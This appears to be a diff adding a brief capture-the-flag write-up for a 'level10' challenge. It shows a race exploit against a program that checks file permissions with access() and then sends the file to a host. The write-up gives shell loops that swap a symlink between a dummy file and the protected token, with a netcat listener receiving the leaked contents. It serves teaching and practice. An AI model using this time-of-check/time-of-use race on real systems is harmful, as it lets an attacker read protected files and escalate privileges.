@@ -1,0 +1,37 @@
+- When we entered to level10 user, we found 2 files: level08: executable file, 
+  token we don’t have permission to read it.
+
+
+- We found that the program take two arguments (a file, a host).
+
+- It sends file to host if we have access to it, so we launch a listener in our machine with netcat in port 6969 
+
+    (nc -l 6969)
+
+- We created a testfile /tmp/test with test as data.
+
+- We execute the program and we got the the data in our machine
+
+- We tried to create a symbolic link for token in tmp but it didn’t work
+
+- we run ltrace cmd to trace the program and we found that the program is using 
+  the access func to check the permission.
+
+- This function is vulnerable to check permissions and like what the man said
+
+- We exploited this security hole by bu using the time between access and open to change the file.
+
+// open connection in the machine listenner
+  while true; do nc -l 6969; done 
+
+// create a tmp file
+  echo “” > /tmp/a
+
+// launch a loop that create a symbolic link to (/tmp/a, token), and delete it
+  while true; do ln -s /tmp/a /tmp/b; rm -f /tmp/b; ln -s ~/token /tmp/b; rm -f /tmp/b ; done
+
+// launch a loop that exucute the program with /tmp/b
+  while true; do ./level10 /tmp/b  ${host}; done
+
+
+- It’s work and we got the flag.
